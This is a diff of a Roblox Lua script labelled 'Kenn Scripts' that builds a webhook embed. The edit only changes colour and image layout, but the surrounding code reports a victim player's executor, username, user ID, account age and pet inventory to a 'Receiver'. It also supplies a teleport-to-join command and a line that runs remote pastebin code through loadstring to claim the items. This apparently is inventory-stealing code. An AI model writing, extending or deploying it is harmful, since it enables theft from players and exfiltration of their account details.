@@ -86,11 +86,13 @@ local data = {
   embeds = {
     {
       title = '⭐ Kenn Scripts',
-      image = {
-        url = avatarUrl
-    }
       description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**💼 Execute To Join Them**:\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```\n**🎁 claim All Script**:\n```lua\nUsername = "'.. tostring(plr) ..'"loadstring(game:HttpGet("https://pastebin.com/raw/GzXc94aX"))()```',
-      color = 0xff0000
+      color = 0x00ff00,
+      fields = {
+        image = {
+        url = avatarUrl
+        }
+      }
     }
   }
 }
